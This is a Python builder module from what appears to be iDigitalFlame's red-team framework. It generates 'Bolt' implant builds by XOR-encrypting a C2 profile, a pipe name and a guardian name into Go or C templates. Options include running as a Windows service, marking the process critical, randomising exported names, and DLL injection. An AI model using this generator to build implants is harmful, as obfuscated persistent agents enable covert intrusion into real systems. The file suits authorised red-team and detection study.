#!/usr/bin/python3
# Copyright (C) 2020 - 2022 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from secrets import token_bytes
from include.config import Config
from include.util import nes, xor
from argparse import BooleanOptionalAction
from os.path import expanduser, expandvars, join
from include.builder import go_bytes, random_chars
from include.manager import Manager, is_str, is_file, str_lower

_LINKERS = {
    "tcp": "t",
    "pipe": "p",
    "event": "e",
    "mutex": "m",
    "mailslot": "n",
    "semaphore": "s",
}
_HELP_TEXT = """ Generates a Bolt build based on the supplied profile and behavior arguments.

 Arguments
  CGO Build Arguments
   -T                 <thread_name>   |
   --thread
   -F                 <function_name> |
   --func

  Bolt Specific Arguments
   -n                 <profile_file>  |
   --profile
   -L                                 |
   --load
   -P                 <pipe_name>     |
   --pipe
   -I
   --ignore
   -W                 <guardian_name> |
   --guardian
   -E                 <linker_type>   |
   --linker

  Behavior Arguments
   -S
   --service
   -A                 <service_name>  |
   --service-name
   -R                 <checks>        |
   --checks
   -K
   --critical
"""


class Bolt(object):
    __slots__ = ("_m",)

    def __init__(self):
        self._m = Manager("bolt")

    def args_help(self):
        return _HELP_TEXT

    def check(self, cfg):
        self._m.verify(cfg)
        try:
            Config.from_file(expanduser(expandvars(cfg["profile"]))).json()
        except ValueError as err:
            raise ValueError(f'"profile" "{cfg["profile"]}" is invalid: {err}') from err
        if cfg["load"] and not nes(cfg["pipe"]):
            raise ValueError('"pipe" must be a non-empty string')
        if not cfg["ignore"] and not nes(cfg["guardian"]):
            raise ValueError('"guardian" must be a non-empty string')
        if cfg["service"] and not nes(cfg["service_name"]):
            raise ValueError('"service_name" must be a non-empty string')

    def config_load(self, cfg):
        # Bolt Specific Options
        self._m.add("pipe", ("-P", "--pipe"), "", is_str(True), str)
        self._m.add("load", ("-L", "--load"), False, action=BooleanOptionalAction)
        self._m.add("ignore", ("-I", "--ignore"), False, action=BooleanOptionalAction)
        self._m.add(
            "linker",
            ("-E", "--linker"),
            "event",
            is_str(False, min=1, choices=_LINKERS),
            str_lower,
        )
        self._m.add("guardian", ("-W", "--guardian"), "", is_str(min=1), str)
        self._m.add("profile", ("-n", "--profile"), "", is_file(), str)
        # Behavior/Type Options
        self._m.add("service_name", ("-A", "--service-name"), "", is_str(True), str)
        self._m.add("service", ("-S", "--service"), False, action=BooleanOptionalAction)
        self._m.add("checks", ("-R", "--checks"), "", is_str(True), str)
        self._m.add(
            "critical", ("-K", "--critical"), False, action=BooleanOptionalAction
        )
        # Build Options
        self._m.add("func", ("-F", "--func"), "", is_str(True, ft=True), str)
        self._m.add("thread", ("-T", "--thread"), "", is_str(True, ft=True), str)
        self._m.init(cfg)

    def args_pre(self, parser):
        self._m.prep(parser)

    def args_post(self, cfg, args):
        self._m.parse(cfg, args)

    def print_options(self, cfg, root, file):
        print("- | Bolt Generator", file=file)
        print(f'- | = {"Profile:":20}{cfg["profile"]}', file=file)
        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
        print(f'- | = {"Load:":20}{cfg["load"]}', file=file)
        if cfg["load"]:
            print(f'- | = {"Pipe:":20}{cfg["pipe"]}', file=file)
        print(f'- | = {"Ignore:":20}{cfg["ignore"]}', file=file)
        if not cfg["ignore"]:
            print(f'- | = {"Linker:":20}{cfg["linker"].title()}', file=file)
            print(f'- | = {"Guardian:":20}{cfg["guardian"]}', file=file)
        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
        if cfg["service"]:
            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
        if not root.get_option("cgo"):
            return
        if nes(cfg["thread"]):
            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
        else:
            print(f'- | = {"CGO Thread:":20}[random]', file=file)
        if nes(cfg["func"]):
            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
        else:
            print(f'- | = {"CGO Func:":20}[random]', file=file)

    def run(self, cfg, base, workspace, templates):
        k = token_bytes(64)
        e = _LINKERS[cfg["linker"]]
        p = xor(k, cfg["pipe"].encode("UTF-8"))
        g = xor(k, cfg["guardian"].encode("UTF-8"))
        n = xor(k, Config.from_file(expandvars(expanduser(cfg["profile"]))))
        t = "bolt.go"
        if cfg["service"] and nes(cfg["service_name"]):
            t = "bolt_service.go"
        c = cfg["checks"]
        if not nes(c):
            c = "false"
        d = templates[t].substitute(
            checks=c,
            event=f'"{e}"',
            key=go_bytes(k),
            pipe=go_bytes(p),
            guard=go_bytes(g),
            profile=go_bytes(n),
            service=f'"{cfg["service_name"]}"',
            load="true" if cfg["load"] else "false",
            ignore="true" if cfg["ignore"] else "false",
            critical="true"
            if cfg["critical"] and not workspace["library"] and cfg["service"]
            else "false",
            # BUG(dij): Let's NOT set DLL files as critical for now. We can't
            #           control how they /exactly/ handle injection so we don't
            #           want to leave systems crashing.
        )
        del k, e, p, g, n, t
        p = join(base, "bolt.go")
        with open(p, "w") as f:
            f.write(d)
        del d
        return p

    def run_cgo(self, export, cfg, base, workspace, templates):
        t = "bolt.c"
        if workspace["library"]:
            if cfg["service"] and nes(cfg["service_name"]):
                t = "bolt_dll_service.c"
            else:
                t = "bolt_dll.c"
        n, f = cfg["thread"], cfg["func"]
        if not nes(n):
            n = random_chars(12)
        if not nes(f):
            f = random_chars(12)
        d = templates[t].substitute(
            thread=n, export=export, funcname=f, secondary=workspace["secondary"]
        )
        del t, n, f
        p = join(base, "entry.c")
        with open(p, "w") as f:
            f.write(d)
        del d
        return (p, "bolt")
